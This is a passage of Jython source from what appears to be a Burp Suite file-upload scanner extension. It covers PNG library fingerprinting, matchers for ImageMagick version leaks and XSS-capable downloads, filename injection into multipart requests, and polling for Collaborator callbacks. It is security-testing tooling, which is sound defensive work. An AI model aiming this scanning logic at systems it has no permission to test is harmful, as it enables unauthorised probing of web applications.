        FingerpingTest("junk_after_iend", "junk_after_iend", FingerpingXpng.conversion_success, "junk at the end of the image"),
        FingerpingTest("mng_file", "mng_file", FingerpingXpng.conversion_success, "mng file"),
        FingerpingTest("no_iend", "no_iend", FingerpingXpng.conversion_success, "missing iend"),
        FingerpingTest("nonconsecutive_idat", "nonconsecutive_idat", FingerpingXpng.conversion_success, "non consecutive idat, not legal"),
        FingerpingTest("plte_after_idat", "plte_after_idat", FingerpingXpng.conversion_success, "plte after idat, it should be before"),
        FingerpingTest("png48", "png48", FingerpingXpng.conversion_success, "48bit per pixel png"),
        FingerpingTest("png64", "png64", FingerpingXpng.conversion_success, "64bit per pixel png"),
        FingerpingTest("transparent_truncated_palette", "transparent_truncated_palette", FingerpingXpng.conversion_success, "transparent color is missing in palette"),
        FingerpingTest("truncated_chunk", "truncated_chunk", FingerpingXpng.conversion_success, "truncated chunk at end of file"),
        FingerpingTest("unknown_critical_chunk_bad_checksum", "unknown_critical_chunk_bad_checksum", FingerpingXpng.conversion_success, "chunk marked as critical, but not standard with bad checksum"),
        FingerpingTest("unknown_critical_chunk", "unknown_critical_chunk", FingerpingXpng.conversion_success, "chunk marked as critical, but not standard"),

    ]


class Fingerping:
    def __init__(self):
        self.all_tests = sorted(FingerpingTests.all_tests, key=lambda test: test.name)
        self.all_fingerprints = FingerpingFingerprints.all_fingerprints

    def do_tests(self, image_dict, warn):
        """Test all the images in a directory (don't print warnings when generating fingerprints)"""
        results = {}
        fingerprintScores = {}
        # Initialite the count of matching tests to zero for each fingerprint
        for fingerprint in self.all_fingerprints:
            fingerprintScores[fingerprint.name] = 0
        # Execute each test
        for test in self.all_tests:
            content = image_dict[test.filename]
            image = FingerpingXpng(content)
            if not image.valid == 0:
                # Only execute the test if there is an image to test
                try:
                    result = test.function(image)
                except Exception, e:
                    print "Fingerping test function threw an exception, ignoring this test for this picture. " \
                          "This might occur if the server resized the image, as this module assumes certain sizes. " \
                          "Test filename:", test.filename, "Test function:", repr(test.function) #, "Content:"
                    # print repr(content)
                    # print traceback.format_exc()
                    result = 0
            else:
                result = 0
            # Save the result of the test
            results[test.name] = result

            # Check if the result matches some of the fingeprints and if so, increment the match counter
            for fingerprint in self.all_fingerprints:
                if test.name not in fingerprint.results:
                    # warn if a fingerprint is missing the result for the test being run
                    if warn:
                        print "warning, missing key", test.name, "in", fingerprint.name
                elif fingerprint.results[test.name] == result:
                    fingerprintScores[fingerprint.name] += 1
        return results, fingerprintScores

    def get_results_table(self, scores):
        """Show the fingerprinting result with the most likely library match at the bottom"""
        nb = len(self.all_tests)
        text_score = sorted(scores.iteritems(), key=lambda x: x[1])
        return text_score, nb
# end modules


class DownloadMatcherCollection(object):
    # TODO feature: Due to memory consumption we do not add any upload/preflight requests to the issue as we need to keep them in
    # memory forever. We hope the original brr is kept as a reference rather than a copy in memory so not using
    # too much memory. However, the upload request for each file would be a lot different and would use a lot more
    # memory. I think this is a sane choice, but I haven't tested it.
    # Another problem there: We try to keep the amount of DownloadMatcher as small as possible by putting
    # them in a set and removing duplicates. Therefore several upload requests associate with *one* DownloadMatcher
    # therefore we can not simply match a DownloadMatcher to one upload request...
    # Working with self._callbacks.saveBuffersToTempFiles is therefore not an option
    # In Burp these original request are sometimes recreated from the payloads. However, in our case the
    # payloads are file contents, so again a lot of data we don't want to keep in memory.
    # Not keeping in memory for now.
    def __init__(self, helpers):
        self._collection = {}
        self._scope_mapping = {}
        self._global_matchers = set()
        self._helpers = helpers
        self._create_globals()
        self._thread_lock = threading.Lock()

    def add(self, dl_matcher):
        brr = dl_matcher.issue.get_base_request_response()
        iRequestInfo = self._helpers.analyzeRequest(brr)
        if iRequestInfo.getUrl():
            url = FloydsHelpers.u2s(iRequestInfo.getUrl().toString())
            host = self.add_collection(url)
            with self._thread_lock:
                self._collection[host].add(dl_matcher)

    def add_collection(self, url):
        host = self._get_host(url)
        with self._thread_lock:
            if host not in self._collection:
                print "The DownloadMatcherCollection has now passive checks (at least the global matchers) for", host
                self._collection[host] = set()
        return host

    def _create_globals(self):
        title = "GraphicsMagick version leakage"
        desc = 'The server leaks the GraphicsMagick version used to convert uploaded pictures. Usually it will also ' \
               'leak the temporary path where the file was converted (usually /tmp/gmRANDOM).<br><br>This often ' \
               'happens with tiff files.<br><br>If you uploaded pictures that you processed with GraphicsMagick, ' \
               'make sure this is not a false positive of you uploading such pictures. <br><br>'
        issue = CustomScanIssue([], title, desc, "Tentative", "Low")
        # eg. /tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 http://www.GraphicsMagick.org/ with null bytes in it
        dl_matcher = DownloadMatcher(issue, filecontent="\x20http://www.GraphicsMagick.org/\x00")
        self._global_matchers.add(dl_matcher)

        title = "ImageMagick version leakage"
        desc = 'The server leaks the ImageMagick version used to convert uploaded pictures. Usually it will also leak' \
               'creation date, modification date and title (usually including path on server).<br><br>This often ' \
               'happens with pdf files.<br><br>If you uploaded pictures that you processed with ImageMagick yourself, ' \
               'make sure this is not a false positive of you uploading such pictures. <br><br>'
        issue = CustomScanIssue([], title, desc, "Tentative", "Low")
        # eg.:
        # <<
        # /Title (/var/www/uploads/1DwldMeBFRcexmpkeywordsPHP1IiN.phtml)
        # /CreationDate (D:20170707203121)
        # /ModDate (D:20170707203121)
        # /Producer (ImageMagick 6.5.4-10 2016-12-19 Q16 http://www.imagemagick.org)
        # >>
        dl_matcher = DownloadMatcher(issue, filecontent="/Producer (ImageMagick ")
        self._global_matchers.add(dl_matcher)

        title = "ImageMagick/GraphicksMagick without strip"
        desc = 'The server might convert pictures with ImageMagick or GraphicksMagick. It does not add the -strip command ' \
               'line option while doing that. Therefore the converted image has the plaintext tEXtdate:create in them. ' \
               'at least it was possible to download a file, that looks like it was processed by one of these tools.<br><br>' \
               'Usually also tEXtdate:modify and timestamps are included. This often happens with png files.<br><br>' \
               'If you uploaded pictures that you processed with ImageMagick/GraphicksMagick yourself, make sure this ' \
               'is not a false positive of you uploading such pictures. <br><br>'
        issue = CustomScanIssue([], title, desc, "Tentative", "Low")
        # eg. the following with null bytes in between:
        # #tEXtdate:create2018-02-28T16:17:47+00:00O%tEXtdate:modify2018-02-28T16:17:47+00:00>
        dl_matcher = DownloadMatcher(issue, filecontent="tEXtdate:create")
        self._global_matchers.add(dl_matcher)

    def with_global(self, name, matchers):
        g = set()
        g.update(matchers)
        for m in self._global_matchers:
            if not name in m.reported_for:
                if name in self._scope_mapping:
                    for alt_name in self._scope_mapping[name]:
                        if alt_name in m.reported_for:
                            break
                    else:
                        g.add(m)
                else:
                    g.add(m)
        return g

    def add_scope(self, brr_url, url):
        brr_host = self._get_host(brr_url)
        host = self._get_host(url)
        with self._thread_lock:
            if host in self._collection:
                return
            if brr_host not in self._scope_mapping:
                self._scope_mapping[brr_host] = set()
            if host not in self._scope_mapping[brr_host]:
                print "Scope is adding", repr(host), "as part of scope of", repr(brr_host)
                self._scope_mapping[brr_host].add(host)

    def get_matchers_for_url(self, url):
        hostport = self._get_host(url)
        if not hostport:
            print "Couldn't extract hostport from the url", url
            return []
        with self._thread_lock:
            if hostport in self._collection:
                # print "Found DownloadMatchers", hostport, "that correspond to", url
                return self.with_global(hostport, self._collection[hostport])

            name = self.get_scope(hostport)
            if name:
                # print "Found DownloadMatchers for", name, "that can be used for", url
                return self.with_global(name, self._collection[name])
        return []

    def get_scope(self, hostport):
        for name in self._scope_mapping:
            if hostport in self._scope_mapping[name]:
                if name in self._collection:
                    return name

    def remove_reported(self, url, matcher):
        with self._thread_lock:
            hostport = self._get_host(url)
            if matcher in self._global_matchers:
                matcher.reported_for.append(hostport)
                return
            if hostport in self._collection:
                if matcher in self._collection[hostport]:
                    self._collection[hostport].remove(matcher)
                    return
            else:
                name = self.get_scope(hostport)
                if name and name in self._collection:
                    if matcher in self._collection[name]:
                        self._collection[name].remove(matcher)
                        return

    def _get_host(self, url):
        if not url:
            return None
        try:
            x = urlparse.urlparse(url)
        except ValueError:
            # Catch errors such as the one described on https://github.com/modzero/mod0BurpUploadScanner/issues/12
            return None
        return x.hostname

    def serialize(self):
        no_of_matchers = 0
        serialized_collection = {}
        for host in self._collection:
            serialized_collection[host] = []
            for matcher in self._collection[host]:
                # print "Serialization", host, type(matcher.serialize()), repr(matcher.serialize())
                serialized_collection[host].append(matcher.serialize())
                no_of_matchers += 1
                if no_of_matchers >= BurpExtender.MAX_SERIALIZED_DOWNLOAD_MATCHERS:
                    print "DownloadMatcher tried to serialize more than {} matchers, which at one point would " \
                          "slow done matching. Ignoring any further DownloadMatchers." \
                          "".format(BurpExtender.MAX_SERIALIZED_DOWNLOAD_MATCHERS)
                    return serialized_collection, self._scope_mapping
        #print type(serialized_collection), type(self._scope_mapping)
        return serialized_collection, self._scope_mapping

    def deserialize(self, serialized_object):
        no_of_matchers = 0
        serialized_collection, self._scope_mapping = serialized_object
        for host in serialized_collection:
            print "Deserializing DownloadMatchers for", host
            self._collection[host] = set()
            for matcher in serialized_collection[host]:
                # print "Deserialization", host, type(matcher), repr(matcher)
                temp_matcher = DownloadMatcher(None)
                temp_matcher.deserialize(matcher)
                self._collection[host].add(temp_matcher)
                no_of_matchers += 1
        print "Deserialized {} DownloadMatchers. If you think this is too much, check option to delete settings " \
              "and reload extension. Anyway, if it grows more than {}, some are discarded for performance reasons." \
              "".format(no_of_matchers, BurpExtender.MAX_SERIALIZED_DOWNLOAD_MATCHERS)


class DownloadMatcher(object):
    # For performance reasons the currently unused features are commented out
    def __init__(self, issue,
                 url_content=None, not_in_url_content=None,
                 filename_content_disposition=None, not_in_filename_content_disposition=None,
                 filecontent=None, not_in_filecontent=None,
                 content_type=None,  # not_in_content_type=None,
                 # check_content_disposition=False,
                 check_not_content_disposition=False,
                 check_xss=False,
                 ):
        self.issue = issue

        # Attention: filename url is only a request property!
        # This means this doesn't proof anything (eg. that a file can be downloaded)
        # but just that a request was sent that includes such a filename
        # Therefore this check *must* be combined with another check
        self.url_content = url_content
        self.not_in_url_content = not_in_url_content

        self.filename_content_disposition = filename_content_disposition
        self.not_in_filename_content_dispositon = not_in_filename_content_disposition

        self.filecontent = filecontent
        self.not_in_filecontent = not_in_filecontent

        self.content_type = content_type
        # self.not_in_content_type = not_in_content_type

        # self.check_content_disposition = check_content_disposition
        self.check_not_content_disposition = check_not_content_disposition

        self.check_xss = check_xss

        # TODO feature: My tests show, that Content-Disposition: attachment prevents XSS... proof me wrong please!
        if self.check_xss:
            # It can't be a content-disposition: attachment header (otherwise it's downloaded instead of executed)
            self.check_not_content_disposition = True
        # It must be the correct content-type:
        self.xss_content_types = ["text/", "application/javascript", "image/svg", "application/x-shockwave-flash"]
        # Additionally we could easily also check if X-Content-Type-Options: nosniff is set or not...

        self.content_type_header_marker = "content-type:"
        self.content_disposition_header_marker = "content-disposition: attachment"

        # Special case to keep track where global matchers were reported already
        self.reported_for = []

    def __hash__(self):
        return hash((self.issue.name,
                     self.issue.urlPy,
                     self.url_content,
                     self.not_in_url_content,
                     self.filename_content_disposition,
                     self.not_in_filename_content_dispositon,
                     self.filecontent,
                     self.not_in_filecontent,
                     self.content_type,
                     # self.not_in_content_type,
                     # self.check_content_disposition,
                     self.check_not_content_disposition,
                     self.check_xss))

    def get_header(self, headers, marker):
        for header in headers:
            if marker == header[:len(marker)].lower():
                return header

    def matches(self, url, headers, body):
        if self.url_content:
            if self.url_content not in url and urllib.quote(self.url_content) not in url:
                return False
        if self.not_in_url_content:
            if self.not_in_url_content in url or urllib.quote(self.not_in_url_content) in url:
                return False
        if self.filecontent and self.filecontent not in body:
            return False
        if self.not_in_filecontent and self.not_in_filecontent in body:
            return False

        if self.check_xss:  # or self.content_type or self.not_in_content_type:
            content_type_header = self.get_header(headers, self.content_type_header_marker)
            # if self.content_type:
            #    if not content_type_header or self.content_type not in content_type_header:
            #        return False
            # if self.not_in_content_type and content_type_header:
            #    if self.not_in_content_type in content_type_header:
            #        return False
            if content_type_header and self.check_xss:
                for c_type in self.xss_content_types:
                    if c_type in content_type_header.lower():
                        break
                else:
                    return False

        if self.filename_content_disposition or self.check_not_content_disposition or \
                self.not_in_filename_content_dispositon:  # or self.check_content_disposition:
            content_disposition_header = self.get_header(headers, self.content_disposition_header_marker)
            # if self.check_content_disposition and not content_disposition_header:
            #    return False
            if self.check_not_content_disposition and content_disposition_header:
                return False
            if self.filename_content_disposition:
                if not content_disposition_header or self.filename_content_disposition not in content_disposition_header:
                    return False
            if self.not_in_filename_content_dispositon and content_disposition_header:
                if self.not_in_filename_content_dispositon in content_disposition_header:
                    return False
        return True

    def serialize(self):
        # print [type(x) for x in (self.issue.serialize(), self.url_content, self.not_in_url_content, self.filename_content_disposition, \
        #                          self.not_in_filename_content_dispositon, self.filecontent, self.content_type, \
        #                          self.check_not_content_disposition, self.check_xss, self.xss_content_types, \
        #                          self.content_type_header_marker, self.content_disposition_header_marker)]
        return self.issue.serialize(), self.url_content, self.not_in_url_content, self.filename_content_disposition,\
        self.not_in_filename_content_dispositon, self.filecontent, self.not_in_filecontent, self.content_type, \
        self.check_not_content_disposition, self.check_xss, self.xss_content_types, \
        self.content_type_header_marker, self.content_disposition_header_marker

    def deserialize(self, serialized_object):
        temp_issue = CustomScanIssue(None, None, None, None, None)
        issue, self.url_content, self.not_in_url_content, self.filename_content_disposition, \
        self.not_in_filename_content_dispositon, self.filecontent, self.not_in_filecontent, self.content_type, \
        self.check_not_content_disposition, self.check_xss, self.xss_content_types, \
        self.content_type_header_marker, self.content_disposition_header_marker = serialized_object
        temp_issue.deserialize(issue)
        self.issue = temp_issue


class FileChooserButton(JButton, ActionListener):
    def setup(self, field, button_name):
        self.field = field
        self.addActionListener(self)
        self.setText(button_name)

    def actionPerformed(self, actionEvent):
        chooser = JFileChooser()
        # chooser.setCurrentDirectory(".")
        chooser.setDialogTitle("Choose file")
        chooser.setFileSelectionMode(JFileChooser.FILES_ONLY)
        chooser.setAcceptAllFileFilterUsed(False)
        if chooser.showOpenDialog(self) == JFileChooser.APPROVE_OPTION:
            # print chooser.getCurrentDirectory()
            # print chooser.getSelectedFile()
            self.field.setText(FloydsHelpers.u2s(chooser.getSelectedFile().toString()))
        else:
            print "No file selected"


class DirectoryChooserButton(JButton, ActionListener):
    def setup(self, field, button_name):
        self.field = field
        self.addActionListener(self)
        self.setText(button_name)

    def actionPerformed(self, actionEvent):
        chooser = JFileChooser()
        # chooser.setCurrentDirectory(".")
        chooser.setDialogTitle("Choose directory")
        chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
        chooser.setAcceptAllFileFilterUsed(False)
        if chooser.showOpenDialog(self) == JFileChooser.APPROVE_OPTION:
            # print chooser.getCurrentDirectory()
            # print chooser.getSelectedFile()
            self.field.setText(FloydsHelpers.u2s(chooser.getSelectedFile().toString()))
        else:
            print "No directory selected"


class Table(JTable, IMessageEditorController):
    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
        self._current_rr = None
        return

    def changeSelection(self, row, col, toggle, extend):
        # show the log entry for the selected row
        logEntry = self._extender._log.get(row)
        self._extender._requestViewer.setMessage(logEntry._requestResponse.getRequest(), True)
        self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
        self._extender._currentlyDisplayedItem = logEntry._requestResponse
        self._current_rr = logEntry._requestResponse

        JTable.changeSelection(self, row, col, toggle, extend)
        return

    def getHttpService(self):
        return self._current_rr.getHttpService()

    def getRequest(self):
        return self._current_rr.getRequest()

    def getResponse(self):
        return self._current_rr.getResponse()


class LogEntry:
    def __init__(self, status, requestResponse, url):
        self._status = status
        self._requestResponse = requestResponse
        self._url = url


class CustomRequestResponse(IHttpRequestResponse):
    # Every call in the code to getRequest or getResponse must be followed by
    # callbacks.analyzeRequest or analyze Response OR
    # FloydsHelpers.jb2ps OR
    # another operation such as len()

    def __init__(self, comment, highlight, service, request, response):
        self.com = comment
        self.high = highlight
        self.setHttpService(service)
        self.setRequest(request)
        self.setResponse(response)

    def getComment(self):
        return self.com

    def getHighlight(self):
        return self.high

    def getHttpService(self):
        return self.serv

    def getRequest(self):
        return self.req

    def getResponse(self):
        return self.resp

    def setComment(self, comment):
        self.com = comment

    def setHighlight(self, color):
        self.high = color

    def setHttpService(self, httpService):
        if isinstance(httpService, str):
            self.serv = CustomHttpService(httpService)
        else:
            self.serv = httpService

    def setRequest(self, message):
        if isinstance(message, str):
            self.req = FloydsHelpers.ps2jb(message)
        else:
            self.req = message

    def setResponse(self, message):
        if isinstance(message, str):
            self.resp = FloydsHelpers.ps2jb(message)
        else:
            self.resp = message

    def serialize(self):
        # print type(self.com), type(self.high), type(CustomHttpService.to_url(self.serv)), type(self.req), type(self.resp)
        return self.com, self.high, CustomHttpService.to_url(self.serv), FloydsHelpers.jb2ps(self.req), FloydsHelpers.jb2ps(self.resp)

    def deserialize(self, serialized_object):
        self.com, self.high, service_url, self.req, self.resp = serialized_object
        self.req = FloydsHelpers.ps2jb(self.req)
        self.resp = FloydsHelpers.ps2jb(self.resp)
        self.serv = CustomHttpService(service_url)


class UploadRequestsResponses:
    """
    A class that describes requests/responses from the upload request
    to the downloaded file response again.
    """
    def __init__(self, upload_rr, preflight_rr=None, download_rr=None):
        self.upload_rr = upload_rr
        self.preflight_rr = preflight_rr
        self.download_rr = download_rr


class ColabTest(object):
    def __init__(self, colab_url, urr, issue=None):
        self.colab_url = colab_url
        self.urr = urr
        self.issue = issue


class CustomMultipartInsertionPoint(IScannerInsertionPoint):
    FILENAME_MARKER = '; filename='
    def __init__(self, helpers, newline, req):
        self._helpers = helpers
        self._newline = newline
        self._req = req
        self._is_multipart_filename = False
        self._status_headers = None
        self._body_before = None
        self.original_payload = None
        self._body_after = None
        self.filename_del = None
        self.payload_offset_start = None

        # Now parse the request
        self._parse()

    def _parse(self):
        iRequest = self._helpers.analyzeRequest(self._req)
        self._status_headers, body = self._req[:iRequest.getBodyOffset()], self._req[iRequest.getBodyOffset():]
        headers = self._newline.join(self._status_headers.split(self._newline)[1:])
        # Tested with Firefox, IE, Chrome and Edge and this works
        if "content-type: multipart/form-data" in headers.lower() and \
            "content-disposition: form-data" in body.lower() and \
            CustomMultipartInsertionPoint.FILENAME_MARKER in body:
            self._is_multipart_filename = True
            index = body.index(CustomMultipartInsertionPoint.FILENAME_MARKER) + len(CustomMultipartInsertionPoint.FILENAME_MARKER)
            self._body_before, self._body_after = body[:index], body[index:]
            if self._body_after.startswith('"'):
                self.filename_del = '"'
                self._body_before += self.filename_del
                self._body_after = self._body_after[len(self.filename_del):]
            elif self._body_after.startswith("'"):
                self.filename_del = "'"
                self._body_before += self.filename_del
                self._body_after = self._body_after[len(self.filename_del):]
            else:
                print "Warning: Filename parameter in multipart does not seem to be quoted... using newline as end delimiter"
                self.filename_del = "\n"

            end_index = -1
            while end_index < 0:
                end_index = self._body_after.find(self.filename_del)
                if end_index == -1:
                    print "Error: Filename parameter in multipart starts with", self.filename_del, "but does not seem to end with it."
                    self._is_multipart_filename = False
                    return
                elif end_index > 0 and self._body_after[end_index - 1] == "\\":
                    self._body_after = self._body_after[end_index + 1:]
                    end_index = -1 # we need to go on searching for a non escaped end delimiter...
            self._body_after = self._body_after[end_index:]
            # The original payload is what is between self._body_before and self._body_after
            self.original_payload = body[len(self._body_before):body.index(self._body_after)]
            # Now calculate values for getPayloadOffsets from the original base request:
            self.payload_offset_start = self._req.index(self.original_payload + self._body_after)
        else:
            self._is_multipart_filename = False

    def buildRequest(self, payload):
        # For now we don't fix the Content-Length
        # If we do, then self.payload_offset_start will be wrong, etc.
        # For now it doesn't matter, as this extension doesn't rely on buildRequest()
        # providing a fixed Content-Length, as the calling classes will fix the content-length
        # anyway after modifying the request
        p = self._get_encoded_payload(payload)
        req = self._status_headers + self._body_before + p + self._body_after
        # I know it's a little strange, but as we are implementing the Java API here and need to return byte[]
        # we actually have to return it as a list of integers... stupid, but that's how it is.
        return [ord(x) for x in req]

    def getBaseValue(self):
        return self.original_payload

    def getInsertionPointName(self):
        return "filename"

    def getInsertionPointType(self):
        if self._is_multipart_filename:
            return IScannerInsertionPoint.INS_PARAM_MULTIPART_ATTR
        else:
            return IScannerInsertionPoint.INS_UNKNOWN

    def getPayloadOffsets(self, payload):
        end = self.payload_offset_start + len(self._get_encoded_payload(payload))
        return [self.payload_offset_start, end]

    def _get_encoded_payload(self, payload):
        return payload.replace(self.filename_del, "\\" + self.filename_del)


class CustomScanIssue(IScanIssue):
    def __init__(self, _httpMessages, _name, _detail, _confidence, _severity, _httpService=None, _url=None,
                 _issue_type=0x08000000):
        # Some attributes had to be renamed to end in Py as Jython complains about read-only attributes otherwise...
        self.httpMessagesPy = _httpMessages
        self.name = _name
        self.detail = _detail
        self.severityPy = _severity
        self.confidencePy = _confidence
        self.type = _issue_type
        self.httpServicePy = _httpService
        if not self.httpServicePy and _httpMessages:
            self.httpServicePy = _httpMessages[0].getHttpService()
        self.urlPy = _url

    def create_copy(self):
        # list() makes sure we copy
        return CustomScanIssue(list(self.httpMessagesPy), self.name, self.detail, self.confidencePy,
                               self.severityPy, self.httpServicePy, self.urlPy, self.type)

    def get_base_request_response(self):
        return self.httpMessagesPy[0]

    def getUrl(self):
        return self.urlPy

    def setUrl(self, url):
        self.urlPy = url

    def getIssueName(self):
        return self.name

    def getIssueType(self):
        return self.type

    def getSeverity(self):
        return self.severityPy

    def getConfidence(self):
        return self.confidencePy

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return "This issue was generated by the UploadScanner extension.<br><br>" + self.detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.httpMessagesPy

    def setHttpService(self, service):
        self.httpServicePy = service

    def getHttpService(self):
        return self.httpServicePy

    def serialize(self):
        #print type(self.httpMessagesPy[0].serialize()), [type(x) for x in (self.name, self.detail, self.confidencePy, \
        #                                                                   self.severityPy, CustomHttpService.to_url(self.httpServicePy), str(self.urlPy), self.type)]
        msgs = []
        for x in self.httpMessagesPy:
            if x:
                # x could be a burp.mvi instead of CustomRequestResponse and therefore wouldn't have a serialize method
                m = CustomRequestResponse(x.getComment(), x.getHighlight(), x.getHttpService(), x.getRequest(), x.getResponse())
                msgs.append(m.serialize())
            else:
                msgs.append(None)
        return msgs, self.name, self.detail, self.confidencePy, \
            self.severityPy, CustomHttpService.to_url(self.httpServicePy), str(self.urlPy), self.type

    def deserialize(self, serialized_object):
        messages, self.name, self.detail, self.confidencePy, self.severityPy, service, \
            url_str, self.type = serialized_object
        self.httpMessagesPy = []
        for x in messages:
            if x:
                a = CustomRequestResponse(None, None, None, None, None)
                a.deserialize(x)
                self.httpMessagesPy.append(a)
            else:
                self.httpMessagesPy.append(None)
        self.httpServicePy = CustomHttpService(service)
        self.urlPy = URL(url_str)

    def toString(self):
        txt = "### URL: " + str(self.urlPy)
        txt += "\nName: " + str(self.name)
        # txt += ", Type: " + str(self.type)
        txt += ", Severity: " + str(self.severityPy)
        txt += ", Confidence: " + str(self.confidencePy)
        txt += ", Details: \n" + str(self.detail)
        i = 0
        for msg in self.httpMessagesPy:
            txt += "\n\nHttpService " + str(i) + ": " + CustomHttpService.to_url(msg.getHttpService())
            txt += "\n\nRequest " + str(i) + "\n"+ repr(FloydsHelpers.jb2ps(msg.getRequest()))
            txt += "\n\nResponse " + str(i) + "\n" + repr(FloydsHelpers.jb2ps(msg.getResponse()))
            i += 1
        return txt

class CustomHttpService(IHttpService):
    def __init__(self, url):
        x = urlparse.urlparse(url)
        if x.scheme in ("http", "https"):
            self._protocol = x.scheme
        else:
            raise ValueError()
        self._host = x.hostname
        if not x.hostname:
            self._host = ""
        self._port = x.port
        if not self._port:
            if self._protocol == "http":
                self._port = 80
            elif self._protocol == "https":
                self._port = 443

    def getHost(self):
        return self._host

    def getPort(self):
        return self._port

    def getProtocol(self):
        return self._protocol

    def __str__(self):
        return CustomHttpService.to_url(self)

    @staticmethod
    def to_url(service):
        a = FloydsHelpers.u2s(service.getProtocol()) + "://" + FloydsHelpers.u2s(service.getHost())
        if service.getPort():
            a += ":" + str(service.getPort())
        return a + "/"


class ActionFunction(ActionListener):
    def __init__(self, func):
        self.func = func
    def actionPerformed(self, actionEvent):
        self.func(actionEvent)


class RunnableFunction(Thread):
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()

class CollaboratorMonitorThread(Thread):

    NAME = "UploadScannerExtensionMonitorThread"

    def __init__(self, extension):
        Thread.__init__(self)
        self.extension = extension
        self.colabs = []
        self.stop = False
        self.paused = False
        self.lock = threading.Lock()
        self.setName(CollaboratorMonitorThread.NAME)
        self.saved_interactions_for_later = {}
        self.print_message_counter = 0

    def add_or_update(self, burp_colab, colab_tests):
        # Create a dictionary that maps colab_url to the colab_test objects:
        colab_dict = {}
        for colab_test in colab_tests:
            # print colab_test.colab_url
            colab_dict[colab_test.colab_url] = colab_test
        with self.lock:
            # Check if we already know that burp_colab instance
            for index, instance_dict_tuple in enumerate(self.colabs):
                if burp_colab is instance_dict_tuple[0]:
                    # If yes, replace that slot
                    self.colabs[index] = (burp_colab, colab_dict)
                    break
            else:
                # If not, add a new one
                self.colabs.append((burp_colab, colab_dict))

    def extensionUnloaded(self):
        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        # One idea was on extension unload we just "pause" the functionality of the thread...
        # self.paused = True
        self.stop = True

    def stop(self):
        with self.lock:
            self.stop = True

    def pause(self):
        with self.lock:
            self.paused = True
            self.extension = None

    def resume(self, extension):
        with self.lock:
            self.paused = False
            self.extension = extension

    def run(self):
        while not self.stop:
            if not self.paused:
                with self.lock:
                    # print "Checking interactions..."
                    self.check_interactions()
            for _ in range(0, 8):
                if self.stop:
                    return
                time.sleep(2)

    def check_interactions(self):
        for burp_colab, colab_dict in self.colabs:
            # Create a dictionary that maps colab_url to the interaction objects:
            all_interactions = burp_colab.fetchAllCollaboratorInteractions()
            interactions_dict = {}
            server = FloydsHelpers.u2s(burp_colab.getCollaboratorServerLocation())
            for interaction in all_interactions:
                interaction_id = FloydsHelpers.u2s(interaction.getProperty("interaction_id"))
                interaction_id = burp_colab.add_padding(interaction_id)
                if burp_colab.is_ip_collaborator:
                    found_colab_url = "{}/{}".format(server, interaction_id)
                else:
                    found_colab_url = "{}.{}".format(interaction_id, server)
                # print found_colab_url
                interactions_dict.setdefault(found_colab_url, []).append(interaction)
            # Also check the saved ones
            interactions_dict.update(self.saved_interactions_for_later)
            self.saved_interactions_for_later = {}
            # Loop through interactions and add issues
            for found_colab_url in interactions_dict:
                # print "colab_dict:", repr(colab_dict)
                # print "found_colab_url:", repr(found_colab_url)
                try:
                    colab_test = colab_dict[found_colab_url]
                except KeyError:
                    self.saved_interactions_for_later[found_colab_url] = interactions_dict[found_colab_url]
                else:
                    interactions = interactions_dict[found_colab_url]
                    issue = colab_test.issue.create_copy()
                    issue.detail += self._get_interactions_as_str(interactions)
                    issue.setUrl(self.extension._helpers.analyzeRequest(colab_test.urr.upload_rr).getUrl())
                    issue.httpMessagesPy.append(colab_test.urr.upload_rr)
                    if colab_test.urr.preflight_rr:
                        issue.httpMessagesPy.append(colab_test.urr.preflight_rr)
                    if colab_test.urr.download_rr:
                        issue.httpMessagesPy.append(colab_test.urr.download_rr)
                    self.extension._add_scan_issue(issue)
            if self.saved_interactions_for_later:
                if self.print_message_counter % 10 == 0:
                    print "Found Collaborator interactions where we didn't get the issue details yet, saving for later... " \
                        "This message shouldn't be printed anymore after all scans are finished."  #, repr(self.saved_interactions_for_later.keys())
                self.print_message_counter += 1

    def _get_interactions_as_str(self, interactions):
        desc = ""
        for index, interaction in enumerate(interactions):
            t = FloydsHelpers.u2s(interaction.getProperty("type"))
            desc += "<br><b>Interaction " + str(index) + "</b><br>"
            desc += " ".join(["Type: ", FloydsHelpers.u2s(interaction.getProperty("type")),
                                  "<br>Client IP: ", FloydsHelpers.u2s(interaction.getProperty("client_ip")),
                                  "<br>Timestamp: ", FloydsHelpers.u2s(interaction.getProperty("time_stamp")), "<br>"])
            if t == "DNS":
                desc += "<br>DNS query type: " + FloydsHelpers.u2s(interaction.getProperty("query_type"))
                desc += "<br>RAW query: " + FloydsHelpers.jb2ps(
                    self.extension._helpers.base64Decode(interaction.getProperty("raw_query")))
                desc += "<br>"
            elif t == "HTTP":
                desc += "<br>Protocol: " + FloydsHelpers.u2s(interaction.getProperty("protocol")) + "<br>"
                desc += "<br>RAW " + FloydsHelpers.u2s(interaction.getProperty("protocol")) + " request:<br>" + FloydsHelpers.jb2ps(
                    self.extension._helpers.base64Decode(interaction.getProperty("request"))).replace("\n", "<br>")
                desc += "<br>RAW " + FloydsHelpers.u2s(interaction.getProperty("protocol")) + " response:<br>" + FloydsHelpers.jb2ps(
                    self.extension._helpers.base64Decode(interaction.getProperty("response"))).replace("\n", "<br>")
                desc += "<br>"
        desc += "<br>"
        return desc


class ScanMessageEditorController(IMessageEditorController):
    def __init__(self, scan_controler, msg_type):
        self.sc = scan_controler
        self.methods = {
            "upload" : [self.getUploadHttpService, self.getUploadRequest, self.getUploadResponse],
            "preflight" : [self.getPreflightHttpService, self.getPreflightRequest, self.getPreflightResponse],
            "redownload" : [self.getRedownloadHttpService, self.getRedownloadRequest, self.getRedownloadResponse]
        }
        self.methods = self.methods[msg_type]

    def getHttpService(self):
        return self.methods[0]()

    def getRequest(self):
        return self.methods[1]()

    def getResponse(self):
        return self.methods[2]()

    def getUploadHttpService(self):
        return self.sc.upload_req_service

    def getUploadRequest(self):
        return self.sc.upload_req_view.getMessage()

    def getUploadResponse(self):
        return self.sc.upload_resp_view.getMessage()

    def getPreflightHttpService(self):
        return self.sc.preflight_req_service

    def getPreflightRequest(self):
        return self.sc.preflight_req_view.getMessage()

    def getPreflightResponse(self):
